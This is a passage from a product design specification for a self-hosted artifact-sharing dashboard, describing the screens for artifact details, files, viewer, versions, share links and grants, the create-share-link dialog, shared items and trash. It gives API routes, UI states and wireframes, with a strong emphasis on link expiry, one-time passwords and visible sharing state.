- **States** — *Partially complete* (items tick live as conditions become true — the screen polls `GET /api/v1/status` every 10 s while item 2 is outstanding, so an agent's first post appears without a refresh); *dismissed* (card gone, plain empty state remains); *error fetching status* (checklist renders with all items actionable and none ticked, no error surface — a failed poll must not block onboarding).
- **Interactions** — The token block's **Copy** copies the JSON with the token placeholder intact. It never contains a real token: tokens are shown once, on 11.18, and are not re-fetched into a checklist.
- **Copy references** — §12.3 in full, §12.4 for the linked agent-setup page.

---

## 11.7 — Artifact detail — overview and activity

- **Purpose** — The single page that answers "what is this, who can see it, what has happened to it, and who posted it".
- **Route** — `/~/artifacts/{name}` — `{name}` may contain slashes (`/~/artifacts/q3/market-report`); the router matches greedily to the end of the path minus a known sub-route segment (`files`, `view`, `versions`, `share`).
- **Entry points** — Any row on 11.5, 11.14, 11.16, 11.24; the toast after an upload; an emailed notification link.
- **Permissions** — Owner sees everything. A grantee (`visibility` includes a grant to them, `owner.isSelf === false`) sees a reduced page: overview, files, viewer, **Save a copy**, and nothing else — no share tab, no versions, no activity, no metadata editing. Attempting `/share` or `/versions` as a grantee redirects to the overview with a toast. A signed-in user with no access gets 11.29.10's not-found block inside the shell, matching the API's `404` (P1).
- **Layout** — Two columns above 1100px: a wide main column and a 320px right rail. Below that the rail collapses and its cards stack under the main column, with the **sharing card first** — the sharing state must never fall below the fold on a phone.

```
┌───────────────────────────────────────────────┬─────────────────────────────┐
│ ‹ Artifacts                                   │  SHARING                    │
│                                               │  ◆ Link active              │
│ postcal                            [ Open ↗ ] │  expires 7 Sep 2026,        │
│ Q4 posting calendar                    [ ⋯ ]  │  18:04 UTC (in 14 days)     │
│ ▣ bundle · v2 · 3 files · 110 KB              │  1 link · password set      │
│ share.c52.com/postcal            [ Copy URL ] │  [ Manage sharing ]         │
│                                               ├─────────────────────────────┤
│ ┌ Overview │ Files │ Versions │ Sharing ────┐ │  POSTED BY                  │
│ │                                           │ │  ⬡ grokbot@hosta          │
│ │ ACTIVITY                                  │ │  token shr_01J… · view all  │
│ │ ● Today  14:02  Overwritten → v2          │ │                             │
│ │          by grokbot@hosta               │ ├─────────────────────────────┤
│ │ ● Today  14:02  Link created, 14 days,    │ │  DETAILS                    │
│ │          password set, by you             │ │  Created 3 Aug 2026         │
│ │ ● Yest.  09:11  4 views via "Fairfield"   │ │  Updated 24 Aug 2026        │
│ │ ● 3 Aug  10:40  Posted v1                 │ │  Tags: social, grokbot      │
│ │          by grokbot@hosta               │ │  TTL: none                  │
│ │                          [ Load older ]   │ │  Views: 41 · last 2h ago    │
│ └───────────────────────────────────────────┘ │  [ Edit details ]           │
└───────────────────────────────────────────────┴─────────────────────────────┘
```

- **Components**
  | Element | Source |
  | --- | --- |
  | Name, title, kind, seq, fileCount, totalBytes | `GET /api/v1/artifacts/{name}` |
  | Canonical URL + **Copy URL** | `artifact.url` |
  | **Open ↗** | Navigates to `artifact.url` in a new tab — the real artifact, not the viewer |
  | Tab bar | Overview (this), Files (11.8), Versions (11.10), Sharing (11.12) |
  | Sharing card | 11.29.2 state, plus per-link summary: label, absolute expiry with relative hint, `hasPassword`, `viewCount`; grants listed by handle. **Manage sharing** → 11.12 |
  | Posted-by card | `artifact.createdBy` — token name and `display_prefix`; "view all" filters 11.5 by `?token=` |
  | Details card | `createdAt`, `updatedAt`, `tags[]`, `ttlExpiresAt`, `viewCount`, `lastViewedAt`, `pinned`, and `copiedFrom` when set |
  | Activity feed | `GET /api/v1/artifacts/{name}/activity` — merged audit events and daily view rollups (§8.8) |
- **Activity feed rules** — Reverse chronological, grouped by day with sticky day headers. Every entry names its actor: a token name with the token glyph, a user handle, or "system" for TTL expiry and link sweeps. View entries read "*n* views via **Fairfield listing team**" or "*n* views, signed in" and never carry an identity, an address, or an approximate location (P6) — a footnote in the feed says so once, at the bottom, rather than on each row. Entry types: posted, overwritten, renamed, metadata changed, link created, link revoked, link expired, password changed, granted, grant revoked, copied (including *by another user*, §5.10), trashed, restored, version restored, TTL expired.
- **States**
  - *Loading* — header skeleton, rail card skeletons, feed skeleton.
  - *Not found / no access* — the 11.29.10 not-found block; identical for "never existed" and "not yours".
  - *Trashed* — the whole page renders in a muted treatment behind a persistent bar: "In the trash. Permanently deleted on 23 Sep 2026 (in 30 days)." with **Restore** and **Delete permanently**. Editing, sharing, and versions are disabled; the sharing card reads Private and states that trashing revoked its links, which restoring will not bring back.
  - *TTL approaching* — an amber strip above the tabs, absolute date, with **Keep this artifact** and **Change TTL**.
  - *Link expiring soon* — the sharing card's expiry text turns amber inside 48 h and offers **Extend** inline.
  - *Grantee view* — the header shows `owner.handle` and an advisory: this belongs to someone else and can be deleted by them at any time; **Save a copy** is the primary button (§7.7.1).
  - *No entry point* — a note beside the kind line: the artifact root shows a file listing (R7), with **Set an entry file** opening the Files tab's picker.
  - *Empty activity* — impossible: every artifact has at least a "posted" event.
- **Interactions**
  - `⋯` menu: Rename, Edit details, Set TTL, Pin/Unpin, Copy to my space, Download all, Move to trash.
  - **Rename** opens a dialog stating plainly that the old URL stops working immediately and is not redirected, and that share links keep working because they address the artifact (§7.2). `PATCH /api/v1/artifacts/{name}` `{name}` → on success, replace the route without a history entry. `409 name_taken` shows inline, including the case where a trashed artifact holds the name, with a link to 11.15.
  - **Edit details** — inline dialog for title, description, tags. Optimistic; reverts with an error toast on failure. Passing `visibility` is impossible from this UI by construction; the API's `422 use_share_endpoint` is a backstop, not a path.
  - **Set TTL** — presets (7d, 30d, 90d, custom date, none). With live links, the dialog surfaces the `ttl_with_live_links` warning before confirming: the links die with the artifact (§8.5).
  - **Download all** — `GET /api/v1/artifacts/{name}/archive` streams a `.tar.gz` of the live version.
  - Feed pagination is cursor-based, **Load older** only.
- **Copy references** — §12.5 (11.7), §12.2 for the sharing-state definitions, §12.6 for the rename and TTL warnings.

---

## 11.8 — Artifact detail — files

- **Purpose** — Show exactly what is in the live version, at real paths and sizes, and let the owner choose which file answers at the root.
- **Route** — `/~/artifacts/{name}/files` — with `?version={id}` when viewing a non-live version (reached from 11.11).
- **Entry points** — The Files tab; "no entry point" advisories; R7's dashboard counterpart.
- **Permissions** — Owner and grantee. Grantees see the tree and can download; **Set as entry file** is absent.
- **Layout** — The same header and tab bar as 11.7, then a full-width file tree. Directories are derived by splitting `path` on `/`; the API returns a flat list and the client builds the tree. Depth beyond three levels indents at a fixed 12px to keep long paths readable.

```
┌──────────────────────────────────────────────────────────────────────────┐
│ Files · live version v2 · 3 files · 110 KB          [ Download .tar.gz ] │
├──────────────────────────────────────────────────────────────────────────┤
│  PATH                            TYPE          SIZE      ⋯               │
│  ▾ /                                                                     │
│    index.html            ★ entry  text/html    18.0 KB   ⋯               │
│    style.css                      text/css      4.1 KB   ⋯               │
│    ▾ img/                                                                │
│      chart.png                    image/png    88.1 KB   ⋯               │
└──────────────────────────────────────────────────────────────────────────┘
```

- **Components** — Rows from `GET /api/v1/artifacts/{name}/files?version=…` (`path`, `size`, `contentType`, `sha256`). Entry marker where `path === artifact.entryPath`. Row menu: Open (the artifact URL plus the path), Download (`files/content?path=…`), Copy path, Copy SHA-256, **Set as entry file**. Header shows which version is displayed and, when it is not the live one, a bar linking back to 11.10.
- **States** — *Loading* skeleton tree; *single file* (the tree collapses to one row and the header says "1 file"); *no entry point* (a banner naming R7 behaviour with **Set as entry file** on each HTML row); *file missing at serve time* (not detectable here — the manifest is authoritative); *error* → 11.29.10.
- **Interactions** — **Set as entry file** issues `PATCH /api/v1/artifacts/{name}` `{entryPath}` and takes effect without reposting (§5.9); optimistic star move, revert on failure. Copy SHA-256 exists because it is how an operator confirms deduplication and matches a blob on disk. There is no delete-a-file action: versions are immutable — the note says so where the action would be.
- **Copy references** — §12.5 (11.8).

---

## 11.9 — Artifact viewer

- **Purpose** — Look at the artifact inside the dashboard, with its sharing state visible, without leaving the app.
- **Route** — `/~/artifacts/{name}/view`, `?path=` for a specific file in a bundle, `?version=` for a non-live version.
- **Entry points** — Clicking the kind glyph on 11.5; **Preview** on 11.7; **View** on 11.11 and 11.14.
- **Permissions** — Owner and grantee. Recipients never reach this route — they get the artifact itself, or R2.
- **Layout** — A slim fixed top bar over a full-bleed content region. The bar is 48px and never scrolls. Content fills the rest of the viewport with no page scroll; scrolling happens inside the content element.

```
┌──────────────────────────────────────────────────────────────────────────┐
│ ‹ postcal   ◆ Link active · expires 7 Sep 2026, 18:04 UTC   ⤓  ↗  ✕      │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│                    [ artifact rendered here ]                            │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

- **Components by `kind`**
  | `kind` | Rendering |
  | --- | --- |
  | `page`, `bundle` | `<iframe src="{artifact.url}">` with `sandbox="allow-scripts allow-forms allow-popups allow-same-origin"`. The iframe loads the real artifact path, so relative links resolve exactly as a recipient sees them |
  | `document` (PDF) | `<iframe>` on the file URL; the browser's viewer. Office documents are not rendered — a download card with the file name and size |
  | `image` | `<img>` centred, fit-to-viewport by default, click to toggle 1:1, with dimensions read from the loaded element (not from the file — nothing is probed, §6.6.4) |
  | `video` | Native `<video controls preload="metadata">` on the file URL. Range requests make seeking work (§6.6.4). No transcoding, no poster frame — no poster is generated, ever |
  | `file` | Download card only |
  - Top bar: back to 11.7, artifact name, the 11.29.2 sharing indicator with absolute expiry, **Download**, **Open in a new tab**, **Close** (`Esc`).
  - For a bundle with more than one HTML file, a path selector in the bar listing HTML paths from the manifest.
- **States** — *Loading* (a neutral panel, no spinner over an iframe — the artifact's own load is the feedback); *unrenderable kind* (download card with the content type stated); *version preview* (an amber strip: "Viewing v1. The live version is v3." with **Restore this version**, streaming through `/~/artifacts/{name}/versions/{id}/preview` per §8.2); *no entry point* (the iframe shows R7's listing, which is correct and needs no special case); *video codec unsupported* (the browser's own failure plus a line naming H.264/AAC in MP4 as the format that plays everywhere).
- **Interactions** — `Esc` closes to 11.7. `←`/`→` move between artifacts in the list that was active when the viewer opened, when there was one. Nothing in the viewer mutates the artifact.
- **Copy references** — §12.5 (11.9).

---

## 11.10 — Artifact detail — versions

- **Purpose** — Show every retained version, who made it, what changed by count, and offer restore.
- **Route** — `/~/artifacts/{name}/versions`
- **Entry points** — The Versions tab; the `v{n}` chip on 11.5; the "Overwritten" entries in 11.7's activity feed.
- **Permissions** — Owner only. Grantees do not see version history — it is the owner's working record.
- **Layout** — Header and tabs, then a table with the live version pinned at the top and visually marked. Newest first.

```
┌──────────────────────────────────────────────────────────────────────────┐
│ Versions · 5 kept · retention: last 20, 365 days        [ Retention ⚙ ]  │
├──────────────────────────────────────────────────────────────────────────┤
│  v5  ● LIVE   24 Aug 2026, 18:04 UTC   3 files  110 KB   +0 ~1 −0    ⋯   │
│               grokbot@hosta · "November slots"                         │
│  v4  📌 pinned 17 Aug 2026, 09:22 UTC   3 files  109 KB   +1 ~0 −1   ⋯   │
│               grokbot@hosta                                            │
│  v3           10 Aug 2026, 09:20 UTC    2 files   96 KB   +0 ~2 −0   ⋯   │
│                                                    [ Load older ]        │
└──────────────────────────────────────────────────────────────────────────┘
```

- **Components** — Rows from `GET /api/v1/artifacts/{name}/versions`: `seq`, `isLive`, `createdAt`, `fileCount`, `totalBytes`, `note`, `createdBy`, `changes {added, modified, removed}`. Retention summary from `settings.versionRetention` (§8.3) with a link to 11.21. Row menu: View (11.11), Files, Restore, Pin/Unpin, Delete.
- **States** — *Only one version* (a single live row and a line explaining that overwriting creates the next one — no empty state); *pruned* (a footer line: older versions were removed by retention on a date, linking to the setting); *live row* (Restore and Delete are absent, not disabled — `409 version_is_live` is a backstop); *files purged* (a restore attempt returning `422 restore_files_missing` marks the row unrestorable with an explanation).
- **Interactions**
  - **Restore** — confirm dialog stating exactly what §8.2 says: this creates a **new** version (v6, not a rewind), carries files and `entryPath`, and leaves share links, grants, name, title, tags, TTL, and pinned state untouched. On confirm, `POST …/versions/{id}/restore` with an optional note; the new version is prepended and marked live; toast.
  - **Pin** — `POST …/versions/{id}/pin`; optimistic; pinned versions are exempt from retention.
  - **Delete** — only for non-live versions; soft, with the trash window named; `DELETE …/versions/{id}`.
- **Copy references** — §12.5 (11.10), §12.6 for the restore explanation.

---

## 11.11 — Version preview and compare

- **Purpose** — Look at a specific version and see its manifest against the live one before deciding to restore.
- **Route** — `/~/artifacts/{name}/versions/{id}`
- **Entry points** — A version row on 11.10; an activity entry on 11.7.
- **Permissions** — Owner only.
- **Layout** — Header strip naming the version and its live/non-live status, then two panes side by side above 1000px — **Manifest compare** left, **Preview** right — stacking with compare first below that. Compare first because the decision is made from the file list; the preview confirms it.
- **Components**
  - Compare pane: a per-path diff of two manifests (`GET …/versions/{id}/files` and the live version's files), each row marked *added*, *modified* (size and SHA differ), *removed*, or *unchanged*, with both sizes shown for modified rows. Unchanged rows collapse behind a "show N unchanged" control. **This compares manifests, not contents** — Share does not read files, so there is no line-level diff anywhere in the product, and the pane says so in one line.
  - Preview pane: the 11.9 viewer in an embedded mode, sourced from `/~/artifacts/{name}/versions/{id}/preview` (authenticated proxy, §8.2 — no per-version URL exists publicly).
  - Header: `seq`, `createdAt` absolute, `createdBy`, `note`, `totalBytes`, and buttons **Restore this version**, **Download**, **Back to versions**.
- **States** — *This is the live version* (compare pane replaced by a plain manifest; Restore absent); *deleted version* (`409 version_deleted` → a terminal card; preview unavailable); *large manifest* (over 500 rows, unchanged rows collapse by default and the pane virtualises); *loading* (two skeleton panes).
- **Interactions** — **Restore this version** runs 11.10's confirm and, on success, navigates to 11.10 with the new live version highlighted. Clicking a file row in the compare pane loads that path into the preview pane when it is renderable.
- **Copy references** — §12.5 (11.11).

---

## 11.12 — Sharing panel — links and grants

- **Purpose** — The complete, honest picture of who can currently reach this artifact, and the only place access is changed.
- **Route** — `/~/artifacts/{name}/share`
- **Entry points** — The Sharing tab; **Manage sharing** on 11.7; the sharing chip on 11.5's row menu; the expiring-links banner.
- **Permissions** — Owner only, and only for a signed-in session. **A dashboard session always carries full authority over its own space** — the `share:create` scope constrains API tokens, not people (§7.9). Grantees never see this tab. If the artifact is trashed, the panel renders read-only with `422 artifact_trashed` explained in place.
- **Layout** — Header and tabs, then a status block, then two sections: **Share links** and **People**. The status block is the loudest element on the page and states the widest thing currently true.

```
┌──────────────────────────────────────────────────────────────────────────┐
│  ◆ LINK ACTIVE                                                           │
│  Anyone with the link can view this until 7 Sep 2026, 18:04 UTC          │
│  (in 14 days). A password is required.                                   │
├──────────────────────────────────────────────────────────────────────────┤
│  SHARE LINKS                                    [ + Create share link ]  │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │ Fairfield listing team                              ⚿ password     │  │
│  │ share.c52.com/s/9fq2n4kw…              [ Copy ]                    │  │
│  │ Expires 7 Sep 2026, 18:04 UTC (in 14 days)                         │  │
│  │ 12 views · last 22 Aug 2026 · created by you, 24 Aug 2026          │  │
│  │                              [ Extend ] [ Change password ] [ Revoke ]│
│  └────────────────────────────────────────────────────────────────────┘  │
│  Expired and revoked links (3)                                       ▾   │
├──────────────────────────────────────────────────────────────────────────┤
│  PEOPLE                                            [ + Share with… ]     │
│  sarah   granted 12 Aug 2026 by you · "the Q4 draft"        [ Remove ]   │
└──────────────────────────────────────────────────────────────────────────┘
```

- **Components**
  | Element | Source |
  | --- | --- |
  | Status block | `artifact.visibility` + the earliest live `shareLinks[].expiresAt` |
  | Link cards | `GET /api/v1/artifacts/{name}/links` — `id`, `label`, `displayPrefix`, `expiresAt`, `hasPassword`, `viewCount`, `lastViewedAt`, `createdAt`, `createdBy`, `maxViews` |
  | Link URL | Reconstructed for display as `share.c52.com/s/{displayPrefix}…`; **Copy** copies the full URL, which the client retains in memory only from the creation response |
  | Grants | `GET /api/v1/artifacts/{name}/grants` — handle, note, `createdAt`, `createdBy` |
  | Creator attribution | `createdBy` on each link — a token name when an agent with `share:create` made it, which is exactly the case the owner most needs to see |
- **The full URL problem, decided** — The server stores only `token_hash` and `display_prefix`; the full token is unrecoverable after creation (§3.7). So **Copy** on a link created in an earlier session cannot produce the URL. The card states this plainly and offers **Create a new link** rather than a dead control. A link created in this session keeps its full URL in memory until reload and its **Copy** works. This is a real constraint of the security design and the UI names it instead of hiding it.
- **States**
  - *Private* — the status block reads Private, both sections show their empty state, and **Create share link** is the primary action on the page.
  - *Expiring soon* — a link inside 48 h renders its expiry in amber with **Extend** promoted.
  - *Expired / revoked* — moved into the collapsed section, shown greyed with the reason and date. Never deleted from the list: what used to be reachable is part of the record.
  - *Max views reached* — the card shows "burned after N views" and sits with the expired links.
  - *Trashed artifact* — read-only, with the §5.11 asymmetry stated: trashing revoked these; restoring will not restore them.
  - *Rate limited* — `429 link_create` → **Create share link** disables with a countdown and a line noting that 20 links an hour is the ceiling and the owner has been notified (§10.2.1).
  - *Loading / error* — skeleton cards; 11.29.10 with retry.
- **Interactions**
  - **Create share link** → 11.13. It is a route, not a modal-only state, so it is linkable and survives a refresh.
  - **Extend** — a small popover with the same TTL presets; `PATCH /api/v1/links/{id}` `{ttl}`. The popover states that extension **adds to the current expiry**, and previews the resulting absolute date before confirming (§7.4).
  - **Change password** — a dialog offering *generate a new one*, *set my own*, or *remove the password*. All three revoke every recipient session on that link immediately (P9), which the dialog says before confirming. A generated password is displayed once here, with the same one-time treatment as 11.13.
  - **Revoke** — destructive confirm. This one is **not** reversible and the dialog says so explicitly, in contrast to trash: revoking is immediate, kills recipient sessions, and cannot be undone — a new link is a new URL. On confirm, `DELETE /api/v1/links/{id}`; the card moves to the collapsed section optimistically.
  - **Share with…** — a dialog taking a handle (typeahead over `GET /api/v1/users` restricted to handles on the instance) and an optional note; `POST …/grants`. Errors surface inline: `404 user_not_found`, `409 grant_exists`, `409 cannot_grant_to_self`.
  - **Remove** a grant — confirm; takes effect on the grantee's next request (§7.7).
- **Copy references** — §12.5 (11.12), §12.2 for what each level means, §12.6 for the revoke and password warnings.

---

## 11.13 — Create share link dialog

> This is the most consequential screen in the product. It is the moment a private thing becomes
> reachable by anyone holding a URL. It is a deliberate, multi-field flow with a confirmation
> step and a terminal success state — never a toggle, never a one-click "share" button, and
> never available in bulk across multiple artifacts.

- **Purpose** — Create exactly one share link, with the owner having seen precisely what becomes reachable, for how long, and under what protection, before anything is created.
- **Route** — `/~/artifacts/{name}/share/new`. Rendered as a modal over 11.12; the URL changes so the flow is linkable, refresh-safe, and back-button-safe. Closing returns to `/~/artifacts/{name}/share`.
- **Entry points** — **Create share link** on 11.12; **Share…** in a row menu on 11.5 or 11.16 (which routes through 11.12 first, so the owner always sees existing links before adding another); the 403 remediation link an agent hands its human when `share_create_link` fails on scope (§7.9).
- **Permissions** — Owner, signed in. Not reachable for an artifact you do not own, or one that is trashed (`422 artifact_trashed` → the dialog refuses to open and 11.12 explains why).

### 11.13.1 Layout

One modal, 520px wide, three sequential states in the same frame: **Configure → Confirm → Created**. The header and the "what becomes reachable" summary persist across all three so the subject never leaves the screen. The modal does not scroll on a 720px-tall viewport in the Configure state; below that it scrolls with the summary pinned.

```
┌── Create a share link ─────────────────────────────────── ✕ ─┐
│                                                              │
│  ┌────────────────────────────────────────────────────────┐  │
│  │ ▣ postcal — Q4 posting calendar                        │  │
│  │   bundle · 3 files · 110 KB · live version v2          │  │
│  │   Currently: ○ Private — only you                      │  │
│  │   Anyone with this link will see the CURRENT version,  │  │
│  │   including any future updates by grokbot@hosta.     │  │
│  └────────────────────────────────────────────────────────┘  │
│                                                              │
│  HOW LONG                                                    │
│  ( ) 30 minutes   ( ) 24 hours   (•) 14 days  ← your default │
│  ( ) 90 days      ( ) 180 days   ( ) Custom…                 │
│  → Expires 7 Sep 2026, 18:04 UTC (in 14 days)                │
│                                                              │
│  PASSWORD                                                    │
│  ( ) No password — anyone with the link gets in              │
│  (•) Generate a password for me                              │
│  ( ) Set my own password                                     │
│      [                                        ] min 8 chars  │
│                                                              │
│  LABEL (only you see this)                                   │
│  [ Fairfield listing team                                 ]  │
│                                                              │
│  ▸ Advanced — burn after N views                             │
│                                                              │
│                            [ Cancel ]  [ Continue → ]        │
└──────────────────────────────────────────────────────────────┘
```

### 11.13.2 What becomes reachable — the summary block

Always the first thing in the modal, and the only part rendered before the form controls. It is not decorative; it exists so that "what am I about to hand out" is never a memory exercise.

| Line | Source |
| --- | --- |
| Kind glyph, name, title (title omitted if null — the name stands alone) | `GET /api/v1/artifacts/{name}` |
| `kind` · `fileCount` files · `totalBytes` · live version `v{seq}` | same |
| Current state, using the 11.29.2 component | `visibility` |
| The follow-updates warning | Constant copy (§7.2): the link addresses the artifact, so future overwrites are visible to whoever holds it. When `createdBy.type === 'token'`, the sentence **names the agent**, because "an agent can change what this link shows" is the specific risk |
| Entry-point note, when `entryPath` is null | The recipient sees a file listing, not a page |
| Framing note, when the artifact declared `allowFraming` and a password is being set | The flag is ignored for password-protected links (§6.6.6) |

### 11.13.3 The TTL picker

- Presets: **30 minutes**, **24 hours**, **14 days**, **90 days**, **180 days**, **Custom**.
- The option equal to `SHARE_DEFAULT_SHARE_TTL` (14 days by default) is preselected and carries the marker "your default", sourced from `GET /api/v1/settings` → `defaultShareTtl`. A user who changed it in 11.21 sees their own value marked instead.
- Any preset exceeding `SHARE_MAX_SHARE_TTL` (180 days) is rendered disabled with the ceiling stated, rather than hidden — the limit should be visible.
- **Custom** reveals a date-time control, minimum now + 5 minutes, maximum now + `SHARE_MAX_SHARE_TTL`. It submits `ttl` as a duration string computed from the chosen instant, so the server remains the clock authority.
- Under the picker, always: `→ Expires 7 Sep 2026, 18:04 UTC (in 14 days)`. Absolute first, relative in parentheses, recomputed on every change and rendered in the user's chosen timezone display setting with `UTC` shown when that setting is UTC (11.29.3).
- There is no "never expires" option and no way to reach one. If a user asks, the copy answers: every link expires, by design (P4).

### 11.13.4 The password choice

Three radio options, never a checkbox, because the middle option has a consequence the user must see before confirming.

| Option | Behaviour |
| --- | --- |
| **No password** | `password: null`. Selecting it reveals one line of consequence copy: anyone who receives, forwards, or finds this URL can view the artifact until it expires. |
| **Generate a password for me** *(default)* | `password: true`. The server generates `{adjective}-{noun}-{2 digits}` and returns it once (§7.4). The helper line explains it is designed to be read aloud. |
| **Set my own** | A text field, minimum 8 characters, no composition rules, no strength meter — a meter would imply rules the server does not enforce. Client-side validation only checks length; `422 password_too_short` is the backstop. The field is `type="password"` with a reveal toggle and `autocomplete="new-password"`. |

Generate is the default because a link with a password is the safer thing to create by accident, and a generated one is guaranteed to be a real secret rather than a habit.

### 11.13.5 Label and advanced

- **Label** — free text, ≤ 120 characters, optional but always visible (not behind "advanced"), with helper text saying it is shown only to the owner and appears in link lists, activity, and audit records. A label makes the link cards on 11.12 usable a month later, which is why it is not buried.
- **Advanced** — collapsed by default, holding only **burn after N views**: an integer ≥ 1 mapping to `maxViews`. The helper text defines the unit precisely: distinct viewer-days, not requests, so one person reloading a page does not burn the link. Rarely wanted; hidden accordingly.

### 11.13.6 Confirm

**Continue** does not create anything. It replaces the form with a read-back panel and a single primary button reading **Create link**:

```
┌── Create a share link ─────────────────────────────────── ✕ ─┐
│  ▣ postcal — Q4 posting calendar                             │
│                                                              │
│  You are about to make this reachable by anyone holding a    │
│  URL, until it expires.                                      │
│                                                              │
│  Expires    7 Sep 2026, 18:04 UTC  (in 14 days)              │
│  Password   Generated — shown once, on the next screen       │
│  Label      Fairfield listing team                           │
│  Views      Unlimited                                        │
│                                                              │
│  You will be emailed when this link is created, and again    │
│  24 hours before it expires.                                 │
│                                                              │
│                              [ ‹ Back ]  [ Create link ]     │
└──────────────────────────────────────────────────────────────┘
```

The email sentence is present because `settings.notifyOnShare` defaults to true (§7.3); when a user has disabled it, that line is replaced by a quieter one noting notifications are off, with a link to 11.21. Being told what will and will not reach your inbox is part of understanding what you just did.

### 11.13.7 Created — the success state

The terminal state. It does not auto-dismiss, cannot be dismissed by clicking the backdrop, and cannot be closed by `Esc`; only the explicit **Done** button closes it. The password is displayed here and nowhere else, ever.

```
┌── Share link created ─────────────────────────────────────────┐
│  ✓ postcal is now reachable by anyone with this link          │
│                                                               │
│  LINK                                                         │
│  https://share.c52.com/s/9fq2n4kwPz3mXr7bTvQ8dL   [ Copy ]    │
│                                                               │
│  PASSWORD — shown once, right now                             │
│  ┌─────────────────────────────────────────────┐              │
│  │  civil-marmot-71                  [ Copy ]  │              │
│  └─────────────────────────────────────────────┘              │
│  This is the only time this password is displayed. It is not  │
│  stored in a form anyone can read, including us. If you lose  │
│  it, create a new link.                                       │
│                                                               │
│  Expires 7 Sep 2026, 18:04 UTC (in 14 days)                   │
│                                                               │
│  [ Copy link and password ]                    [ Done ]       │
└───────────────────────────────────────────────────────────────┘
```

- **Copy link and password** puts both on the clipboard as two lines, formatted for pasting into a message, with the absolute expiry as a third line — so the thing the owner sends states its own end date.
- Individual **Copy** controls for each. Each toasts and swaps its label to "Copied" for 2 seconds.
- **Done** is the only exit and is styled as the primary action. Closing without copying is possible and the password is then gone; the button carries no confirmation, because a nag would train dismissal.
- On close, 11.12 refetches and the new link card appears at the top, retaining the full URL in memory for this session's **Copy**.

### 11.13.8 States

| State | Behaviour |
| --- | --- |
| Loading the artifact | Skeleton summary block; the form is disabled until the summary is real. Never let someone configure a link for an artifact whose identity has not loaded. |
| Submitting | **Create link** shows a spinner and disables; the modal cannot be closed mid-request. |
| `403 insufficient_scope` | Cannot occur from a session; if it does, treat as a generic failure and log — a session is not scope-limited (§7.9). |
| `422 ttl_too_long` | Inline under the TTL picker with the server's ceiling; returns to Configure. |
| `422 password_too_short` | Inline under the password field; returns to Configure with the value preserved. |
| `422 artifact_trashed` | Terminal error card with **Go to trash** → 11.15. |
| `429 rate_limited` (`link_create`) | Terminal card naming the 20/hour ceiling, the `Retry-After` countdown, and the fact that the owner has been notified (§10.4). |
| Network failure mid-create | The dialog stays on Confirm with a retry button and a warning that a link **may** have been created; the retry sends the same `Idempotency-Key` generated when Confirm was first pressed, so a retry cannot produce a second link (§5.1.3). |
| Success with `warnings[]` | Rendered under the expiry line in the Created state, not as blocking errors. |

### 11.13.9 Interactions and rules

- `Esc` and backdrop click close the modal in Configure and Confirm (with no confirmation — nothing has been created). Both are inert in Created.
- The browser back button from Confirm returns to Configure; from Created it closes to 11.12 and the password is gone. This is stated in the Created panel's copy.
- The form never pre-fills a label from the artifact's title. Guessing who a link is for is exactly the class of inference this product refuses.
- **There is no bulk create.** Sharing is per-artifact and each one gets this dialog. A user with ten artifacts to share performs the act ten times, and that friction is the feature.
- **Copy references** — §12.5 (11.13) carries every string on this screen verbatim; §12.6 the advisory catalogue; §12.9 `link_created`.

---

## 11.14 — Shared with me

- **Purpose** — Everything other users on the instance have granted to this user, with the fact that it can vanish made obvious.
- **Route** — `/~/shared`
- **Entry points** — Sidebar; the emailed grant notification. The sidebar item is hidden when the instance has exactly one user and the call has never returned an item.
- **Permissions** — Any session. Lists only artifacts with a live grant to the caller (§7.7).
- **Layout** — Same table shape as 11.5 with the sharing column replaced by an **Owner** column and a per-row advisory. The filter bar loses the agent filter (another user's tokens are not visible) and gains an owner filter.
- **Components** — `GET /api/v1/artifacts?shared=true`: `name`, `title`, `kind`, `owner.handle`, `updatedAt`, `totalBytes`, `url` (the canonical `/~handle/name` form), grant note. Row actions: Open, View (11.9), Download, **Save a copy**.
- **States**
  - *Empty* — "Nothing has been shared with you." plus one line explaining that another user must grant it; no call to action, since the user cannot cause it.
  - *Owner may delete this* — a persistent, low-emphasis line on every row: this belongs to `@handle` and disappears if they delete it. **Save a copy** sits beside it. The advisory is per row rather than a page banner because the failure is per artifact and silent (§7.7.1).
  - *Grant revoked while viewing* — the next request 404s; the row is removed on refetch with a toast naming the artifact.
  - *Loading / error* — as 11.5.
- **Interactions** — **Save a copy** opens a small dialog with a name field defaulted to the source name (with a numeric suffix if taken in the caller's space) and a title field; `POST /api/v1/artifacts/{name}/copy`. The dialog states the two things that matter: it costs no storage against quota beyond what dedup implies, and the copy is **private with no share links regardless of the source** (§5.10). On success, toast with a link to the new artifact in the caller's own space, and a note that the original owner sees the copy in their activity.
- **Copy references** — §12.5 (11.14).

---

## 11.15 — Trash

- **Purpose** — Show what was deleted, when it disappears for good, how much space it is holding, and how to get it back.
- **Route** — `/~/trash`
- **Entry points** — Sidebar; the undo toast's expiry; the over-quota banner; `409 name_taken` when a trashed artifact holds a name.
- **Permissions** — Any session, own space only. **Delete permanently** requires nothing extra for a signed-in user; the `artifacts:delete` scope constrains tokens (§4.6.1).
- **Layout** — A header strip with the trash's own storage figure and **Empty trash**, then a table sorted by deletion time, newest first.

```
┌──────────────────────────────────────────────────────────────────────────┐
│  Trash · 12 artifacts · 3.4 GB · deleted after 30 days  [ Empty trash ]  │
│  Items here still count against your storage quota.                      │
├──────────────────────────────────────────────────────────────────────────┤
│  NAME              DELETED           GONE ON                SIZE         │
│  ▣ old-deck        24 Aug, 11:02     23 Sep 2026 (30 days)  2.1 GB   ⋯   │
│    by grokbot@hosta                                                    │
│  ▤ q2/report       02 Aug, 09:40     01 Sep 2026 (in 8 days) 410 MB  ⋯   │
│    by you                                    [ Restore ]                 │
└──────────────────────────────────────────────────────────────────────────┘
```

- **Components** — `GET /api/v1/artifacts?trashed=true`: `name`, `kind`, `trashedAt`, computed purge date (`trashedAt + SHARE_TRASH_DAYS`), `totalBytes`, `createdBy`. Trash total from `GET /api/v1/status` → `trashBytes`. Row menu: Restore, Delete permanently, View files.
- **States**
  - *Empty* — "Nothing in the trash." with a line stating the window: deleted artifacts stay here 30 days.
  - *Purging soon* — rows within 48 h of their purge date render the date in amber and float to the top of a "Going soon" group above the rest.
  - *Name conflict* — a row whose name has since been taken by a new artifact is marked; **Restore** opens a rename dialog first, because `POST …/restore` returns `409 name_taken` otherwise (§8.9).
